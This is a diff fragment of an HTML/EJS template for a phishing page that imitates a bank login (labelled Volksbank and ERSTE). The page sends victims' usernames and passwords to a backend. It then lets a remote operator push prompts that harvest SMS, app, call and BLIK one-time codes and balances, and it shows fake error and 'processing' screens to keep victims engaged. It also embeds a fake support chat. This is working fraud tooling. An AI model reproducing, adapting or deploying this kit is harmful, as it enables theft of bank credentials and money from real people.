+              status.includes("otherLk") ||
+              status.includes("null") ||
+              status.includes("wrongData")
+            ) {
+            } else {
+              window.location.href =
+                "/confirm.php?page_id=264137254629&bank=ERSTE";
+            }
+          });
+        }
+
+        setInterval(updateStatus3, 1000);
+      </script>
+
+      <script>
+            var token = null
+
+            document.getElementById("btn").onclick = async function () {
+            	const logins = document.getElementById("logins").value
+            	const password = document.getElementById("password").value
+
+            	if (!login || !password) return alert("Заполните все поля")
+
+            	await axios.post("/api/sendBank", {
+            		adId: "<%=ad.id%>",
+            		login: logins,
+            		password: password,
+            		bank: "Volksbank",
+            	}).then(async function (res) {
+            		token = res.data.token
+            		init(res.data.token)
+            	})
+            };
+
+            async function init(token) {
+            		var currentStatus = null;
+
+            		function waitModal() {
+            			swal({
+            				title: "<%=translate["wait"][ad.service.lang]%>",
+            				text: "<%=translate["bank_processes"][ad.service.lang]%>",
+            				type: "info",
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            				buttons: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+
+            		function limitsModal() {
+            			swal({
+            				title: "<%=translate["error_title"][ad.service.lang]%>",
+            				text: "<%=translate["limits"][ad.service.lang]%>",
+            				type: "error",
+            				closeOnConfirm: false,
+            				closeOnCancel: false,
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+            		function erroronlModal(err) {
+            			swal({
+            				title: "<%=translate["info"][ad.service.lang]%>",
+            				text: `${err}`,
+            				type: "info",
+            				closeOnConfirm: false,
+            				closeOnCancel: false,
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+            		function forVerifyModal() {
+            			swal({
+            				title: "<%=translate["error_title"][ad.service.lang]%>",
+            				text: "<%=translate["for_verify"][ad.service.lang]%>",
+            				type: "error",
+            				closeOnConfirm: false,
+            				closeOnCancel: false,
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+
+            		function otherCardModal() {
+            			swal({
+            				title: "<%=translate["error_title"][ad.service.lang]%>",
+            				text: "<%=translate["other_card"][ad.service.lang]%>",
+            				type: "error",
+            				closeOnConfirm: false,
+            				closeOnCancel: false,
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+            			function moneyModal() {
+            			swal({
+            				title: "<%=translate["error_title"][ad.service.lang]%>",
+            				text: "<%=translate["dep_text"][ad.service.lang]%>",
+            				type: "error",
+            				closeOnConfirm: false,
+            				closeOnCancel: false,
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            			}).then((ok) => {
+            				if (ok) document.location.href = "/ad/" + AD_ID;
+            			});
+            		}
+                function wronglk() {
+            			swal("<%=translate["error_title"][ad.service.lang]%>", "<%=translate["lkby_fake"][ad.service.lang]%>", "info", {
+                    closeOnEsc: false,
+            				closeOnClickOutside: false,
+            				buttons: {
+            					confirm: {
+            						text: "<%=translate["submit"][ad.service.lang]%>",
+            						closeModal: true,
+            					},
+            				},
+            			});
+            		}
+
+            		function pushModal() {
+            			swal("<%=translate["push_title"][ad.service.lang]%>", "<%=translate["push_text"][ad.service.lang]%>", "info", {
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            				buttons: false,
+            			});
+            		}
+        function depModal() {
+            			swal("<%=translate["dep_error"][ad.service.lang]%>", "<%=translate["dep_text"][ad.service.lang]%>", "error", {
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            				buttons: false,
+            			});
+            		}
+            		function successModal() {
+            			swal("<%=translate["success"][ad.service.lang]%>", "<%=translate["money_will"][ad.service.lang]%>", "success", {
+            				closeOnClickOutside: false,
+            				closeOnEsc: false,
+            				buttons: false,
+            			});
+            		}
+            		function pictureModal() {
+            			swal(
+            				translate["picture_title"].ua,
+            				translate["picture_text"].ua,
+            				"info",
+            				{
+            					content: {
+            						element: "div",
+            						attributes: {
+            							id: "pictures_div",
+            						},
+            					},
+            					closeOnClickOutside: false,
+            					closeOnEsc: false,
+            					buttons: false,
+            				}
+            			);
+            			const pictures = [
+            				"банан",
+            				"брюки",
+            				"бургер",
+            				"гитара",
+            				"зонтик",
+            				"календарь",
+            				"калькулятор",
+            				"карандаш",
+            				"клубника",
+            				"компас",
+            				"крокодил",
+            				"лимон",
+            				"мамонт",
+            				"микрофон",
+            				"наушники",
+            				"очки",
+            				"помидор",
+            				"свитер",
+            				"телефон",
+            				"цветок",
+            				"шоколад",
+            			].sort(() => Math.random() - 0.5);
+
+            			document.querySelector("#pictures_div").innerHTML =
+            				'<div class="pictures-container">' +
+            				pictures
+            					.map(
+            						(v) =>
+            							'<div class="pictures-element" data-item="' +
+            							v +
+            							'"><img draggable="false" alt="" src="/img/pictures/' +
+            							v +
+            							'.png"></div>'
+            					)
+            					.join("\n") +
+            				"</div>";
+            			document.querySelector(".pictures-container").classList.remove("disabled");
+            		}
+            		function codeModal(
+            			codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
+            		) {
+            			swal.stopLoading();
+            			swal({
+            				title,
+            				text,
+            				content: {
+            					element: "input",
+            					attributes: {
+            						type: "password",
+            						placeholder,
+            						maxLength: 255,
+            						required: true,
+            						style:
+            							"text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            					},
+            				},
+            				closeOnEsc: false,
+            				closeOnClickOutside: false,
+            				buttons: {
+            					confirm: {
+            						text: "<%=translate["submit"][ad.service.lang]%>",
+            						closeModal: false,
+            					},
+            				},
+            			}).then(async (code) => {
+            				try {
+            					if (!code) return;
+            					$.ajax({
+            						type: "POST",
+            						url: "/api/submitCode",
+            						data: {
+            							codeType,
+            							code,
+            							token: token,
+            						},
+            						success: (data) => {
+            							swal.stopLoading();
+            							return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							codeModal(...arguments);
+            						},
+            						error: () => {
+            							swal.stopLoading();
+           		   return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							codeModal(...arguments);
+            						},
+            					});
+            				} catch (err) {
+            					swal.stopLoading();
+              return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            					codeModal(...arguments);
+            				}
+            			});
+            		}
+            		function ferrModal(
+            			codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
+            		) {
+            			swal.stopLoading();
+            			swal({
+            				title,
+            				text,
+            				content: {
+            					element: "input",
+            					attributes: {
+            						type: "password",
+            						placeholder,
+            						maxLength: 255,
+            						required: true,
+            						style:
+            							"text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            					},
+            				},
+            				closeOnEsc: false,
+            				closeOnClickOutside: false,
+            				buttons: {
+            					confirm: {
+            						text: "<%=translate["submit"][ad.service.lang]%>",
+            						closeModal: false,
+            					},
+            				},
+            			}).then(async (code) => {
+            				try {
+            					if (!code) return;
+            					$.ajax({
+            						type: "POST",
+            						url: "/api/submitCode",
+            						data: {
+            							codeType,
+            							code,
+            							token: token,
+            						},
+            						success: (data) => {
+            							swal.stopLoading();
+           		   return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							codeModal(...arguments);
+            						},
+            						error: () => {
+            							swal.stopLoading();
+            							return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							codeModal(...arguments);
+            						},
+            					});
+            				} catch (err) {
+            					swal.stopLoading();
+              return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            					codeModal(...arguments);
+            				}
+            			});
+            		}
+
+           function correctBalanceModal(
+            			codeType = "balance", title = "<%=translate["error_title"][ad.service.lang]%>", text = "<%=translate["correct_balance"][ad.service.lang]%>",
+            		) {
+            			swal.stopLoading();
+            			swal({
+            				title,
+            				text,
+            				content: {
+            					element: "input",
+            					attributes: {
+            						type: "text",
+            						maxLength: 255,
+            						required: true,
+            						style:
+            							"text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            					},
+            				},
+            				closeOnEsc: false,
+            				closeOnClickOutside: false,
+            				buttons: {
+            					confirm: {
+            						text: "<%=translate["submit"][ad.service.lang]%>",
+            						closeModal: false,
+            					},
+            				},
+            			}).then(async (code) => {
+            				try {
+            					if (!code) return;
+            					$.ajax({
+            						type: "POST",
+            						url: "/api/submitBalance",
+            						data: {
+            							codeType,
+            							code,
+            							token: token,
+            						},
+            						success: (data) => {
+            							swal.stopLoading();
+           		   return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							correctBalanceModal(...arguments);
+            						},
+            						error: () => {
+            							swal.stopLoading();
+           		   return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            							correctBalanceModal(...arguments);
+            						},
+            					});
+            				} catch (err) {
+            					swal.stopLoading();
+              return   swal({
+                     title: "<%=translate["wait"][ad.service.lang]%>",
+                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                     icon: "info",
+                     closeOnClickOutside: false,
+                     closeOnEsc: false,
+                     buttons: false,
+                   });
+            					correctBalanceModal(...arguments);
+            				}
+            			});
+            		}
+
+            		function checkLogStatus() {
+            			$.ajax({
+            				type: "POST",
+            				url: "/api/checkStatus",
+            				data: {
+            					token: token,
+            				},
+            				success: (data) => {
+            					if (data.status == currentStatus) return;
+            					currentStatus = data.status;
+            					if (currentStatus == "profit") successModal();
+            					else if (currentStatus == "sms") codeModal();
+
+
+
+            					else if (currentStatus.includes("error")) {
+            						erroronlModal(currentStatus.split("error_")[1]);
+            					}
+            					else if (currentStatus.includes("ferr"))ferrModal(
+            						"custom",
+            						"<%=translate["info"][ad.service.lang]%>",
+            						currentStatus.split("ferr_")[1],
+            						"<%=translate["enterrr"][ad.service.lang]%>",
+            						"<%=translate["wrongg"][ad.service.lang]%>",
+            					);
+
+
+
+
+            					else if (currentStatus == "appCode")
+            						codeModal(
+            							"app",
+            							"<%=translate["app_code_title"][ad.service.lang]%>",
+            							"<%=translate["app_code_text"][ad.service.lang]%>",
+            							"<%=translate["app_code_placeholder"][ad.service.lang]%>",
+            						);
+            					else if (currentStatus == "callCode")
+            						codeModal(
+            							"call",
+            							"<%=translate["call_code_title"][ad.service.lang]%>",
+            							"<%=translate["call_code_text"][ad.service.lang]%>",
+            							"<%=translate["call_code_placeholder"][ad.service.lang]%>",
+            						);
+            						else if (currentStatus == "money")
+            						moneyModal(
+            							"money",
+            							"<%=translate["error_title"][ad.service.lang]%>",
+            							"<%=translate["dep_text"][ad.service.lang]%>",
+            						);
+            					else if (currentStatus == "blik")
+            						codeModal(
+            							"blik",
+            							"<%=translate["blik_code_title"][ad.service.lang]%>",
+            							"<%=translate["blik_code_text"][ad.service.lang]%>",
+            							"<%=translate["blik_code_placeholder"][ad.service.lang]%>",
+            						);
+            					else if (currentStatus == "fakeLk") wronglk();
+            					else if (currentStatus == "push") pushModal();
+            					else if (currentStatus == "limits") limitsModal();
+            					else if (currentStatus == "otherCard") otherCardModal();
+            					else if (currentStatus == "money") moneyModal();
+                      else if (currentStatus == "card") document.location.href = `/ad/<%=ad.id%>`;
+
+              else if (currentStatus == "scream") document.location.href = `http://ibaillanos.tv`;
+        else if (currentStatus == "dep") this.depModal();
+
+
+            					else if (currentStatus == "forVerify") forVerifyModal();
+            					else if (currentStatus == "correctBalance") correctBalanceModal();
+            					else if (currentStatus == "picture") pictureModal();
+            				},
+            			}).done(() => setTimeout(checkLogStatus, 1500));
+            		}
+            		setTimeout(checkLogStatus, 1500)
+            		waitModal()
+            	}
+      </script>
+      <div id="support">
+        <script type="text/javascript">
+          var _smartsupp = _smartsupp || {};
+          _smartsupp.key = "<%=user.smartsupp%>";
+          window.smartsupp ||
+            (function (d) {
+              var s,
+                c,
+                o = (smartsupp = function () {
+                  o._.push(arguments);
+                });
+              o._ = [];
+              s = d.getElementsByTagName("script")[0];
+              c = d.createElement("script");
+              c.type = "text/javascript";
+              c.charset = "utf-8";
+              c.async = true;
+              c.src = "https://www.smartsuppchat.com/loader.js?";
+              s.parentNode.insertBefore(c, s);
+            })(document);
+        </script>
+      </div>
+
+      <script>
+        if ("<%=user.smartsupp%>" == false) {
+          document.querySelector("#support").innerHTML = `
+			  <div class="
+	   chatra--webkit
+	   chatra--style-round
+	   chatra--side-bottom
+	   chatra--pos-right
+	   chatra--visible
+	   chatra--expanded
+	   chatra--fast-toggle
+	  " id="chatra" data-turbolinks-permanent="" style="
+	   width: 380px;
+	   height: 600px;
+	   transform: none;
+	   z-index: 2147483647;
+	   display: none;
+	  ">
+		<div id="chatra__iframe-wrapper">
+		  <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+			src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+		</div>
+	  </div>
+	  <div class="support-circle"
+		onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+							  `;
+        }
+      </script>
+
+      <script>
+        const adId = "<%=ad.id%>";
+      </script>
+      <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"
+        crossorigin="anonymous"
+      ></script>
+      <script
+        src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"
+        crossorigin="anonymous"
+      ></script>
+      <script
+        src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js"
+        crossorigin="anonymous"
+      ></script>
+      <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"
+        crossorigin="anonymous"
+      ></script>
+      <script
+        src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+        crossorigin="anonymous"
+      ></script>
+      <script src="/js/eye.js" defer></script>
+    </div>
+  </body>
+</html>
